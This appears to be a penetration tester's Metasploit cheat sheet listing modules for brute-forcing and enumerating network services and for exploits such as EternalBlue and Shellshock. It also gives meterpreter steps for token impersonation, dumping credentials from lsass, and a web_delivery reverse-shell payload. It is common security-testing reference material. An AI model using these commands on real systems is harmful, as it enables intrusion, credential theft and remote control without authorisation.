#tools/multi/msfconsole 
## Services
### SSH
- Version: `auxiliary/scanner/ssh/ssh_version`
- Login Brute Force:`auxiliary/scanner/ssh/ssh_login`
	- Set `userpass_file`/(`user_file` and `pass_file`)
	- set rhosts
- Enumerate users: `auxiliary/scanner/ssh/ssh_enumusers`
- libssh auth bypass: `auxiliary/scanner/ssh/libssh_auth_bypass`

### HTTP
- Determine the version: `auxiliary/scanner/http/http_version`
- Directory brute force: `auxiliary/scanner/http/brute_dirs`, `auxiliary/scanner/http/dir_scanner`
- Files brute force (specify the extension): `auxiliary/scanner/http/files_dir`
- Robots.txt: `auxiliary/scanner/http/robots_txt`
- Header information: `auxiliary/scanner/http/http_header`
- Login brute force: `auxiliary/scanner/http/http_login`
- Find user names based on errors (only for Apache): `auxiliary/scanner/http/apache_userdir_enum`

### MySQL
- Version: `auxiliary/scanner/mysql/mysql_verion`
- Login brute force: ``auxiliary/scanner/mysql/mysql_login`
	- set rhosts, pass_file, username, etc
#### Following require creds
- Enumeration: ``auxiliary/admin/mysql/mysql_enum`
- Find writable directories: `auxiliary/scanner/mysql/mysql_writable_dirs`
	- Set `dir_list`
	- set rhosts
- Look for files:   `auxiliary/scanner/mysql/mysql_file_enum`
- Run queries: `auxiliary/admin/mysql/mysql_sql`
- Schema dump: `auxiliary/scanner/mysql/mysql_schemadump`
- Hashdump: `auxiliary/scanner/mysql/mysql_hashdump`

### MSSQL
- Login brute force: ``auxiliary/scanner/mssql/mssql_login`
	- set rhosts, pass_file, username, etc
- enumeration: ``auxiliary/scanner/mssql/mssql_enum`
- admin enumeration: `auxiliary/admin/mssql/mssql_enum_sql_logins`
- command execution: `auxiliary/admin/mssql/mssql_exec`

### FTP
- Version detection: `auxiliary/scanner/ftp/ftp_version`
- FTP Auth Scanner (brute force): `auxiliary/scanner/ftp/ftp_login`
- Anonymous login check: `auxiliary/scanner/ftp/anonymous`

### SMB
- Version detection: `auxiliary/scanner/smb/smb_version`
- User enumeration: `auxiliary/scanner/smb/smb_enumusers`
- Enumerate shares: `auxiliary/scanner/smb/smb_enumshares`
- Login brute force: `auxiliary/scanner/smb/smb_login`
- MS17-010 Check: `auxiliary/scanner/smb/smb_ms17_010`
- MS17-010 Exploit: `exploit/windows/smb/ms17_010_eternalblue`

#### Psexec
- Run `psexec` from msfconsole: `exploit/windows/smb/psexec`
	```
	> set session
	> set LPORT, RHOSTS, SMBUser
	> set SMBPass <NTLM hash>
	> set target command/Native upoload # try different ones
	```

### SMTP
- Version: `auxiliary/scanner/smtp/smtp_version`
- User enumeration: `auxiliary/scanner/smtp/smtp_enum`

### WinRM
- Detection: `auxiliary/scanner/winrm/winrm_auth_methods`
- User/pass bruteforce: `auxiliary/scanner/winrm/winrm_login`
- Command runner: `auxiliary/scanner/winrm/winrm_cmd`
- Run script: `exploit/winrm/winrm_script_exec`
	- set FORCE_VBS true

### Samba
- Arbitrary Module Load: `exploit/linux/samba/is_known_pipename`

## OS
### Windows
- Find kernel exploits in Windows: `multi/recon/local_exploit_suggester`
> To run `hashdump` first migrate to `lsass.exe`

### Linux
- Hash Dump: `post/linux/gather/hashdump`
	- set the session

## Functions
### Incognito Module
- Gain access to the machine and get a meterpreter shell
	```
	> getuid
	> pgrep explorer
	> migrate <explorer_id>
	> load incognito
	> list_tokens -u
	> impersonate_token "<DOMAN>\<USER>"
	> getuid # should be now of the impersonated user
	> getprivs # might fail
	> pgrep explorer
	> migrate <explorer's_id>
	> getprivs # now it should work
	```
- Repeat the same to gain access to higher privilege account

> If you have access only as `NT AUTHORITY\LOCAL SERVICE`, you won't be able to migrate to different processes

### Kiwi Module
- Gain access to the target machine and make sure you have elevated privileges (at least Administrator)
- migrate to `$(pgrep lsass)` (otherwise the commands wont work) as lsass manages these hashes
	```
	> load kiwi
	> creds_all
	> lsa_dump_sam # you get the syskey
	> lsa_dump_secret # might provide some clear text creds
	> golden_ticket_create # in AD useful
	> kerberos_ticket_list # for kerberos
	```

## Vulnerabilities
### Linux
#### Shellshock
- `exploit/multi/http/apache_mod_cgi_bash_env_exec`
	- set target IP and path

## Commands
- Exit session: ctrl + Z
- Upgrade a session: `session -u <session no>`

## Plugins
- `db_nmap`
- `db_autopwn`: https://github.com/hahwul/metasploit-autopwn
	- Checks all the exploits and provides the matching ones
	- Run `analyze` to get details of the exploits that can be performed

## Utilities
- Shell to meterpreter
	```
	post/multi/manage/shell_to_meterpreter
	```
- Upgrade a session automatically
	```
	session -u
	```

## Scripts
- Web Deilivery to fire up a webserver and server a payload: `exploit/multi/script/web_delivery`
	```
	set target PSDH (binary)
	set payload windows/shell/reverse_tcp
	set PSH-EncodedCommand False
	set LHOST eth1
	run
	```
	- Copy this code and run directly on your target machine
	- This will give you a direct shell as the logged in user
	- You can covert this with `shell_to_meterpreter` and make sure to set `WIN_TRANSFER VBS` for windows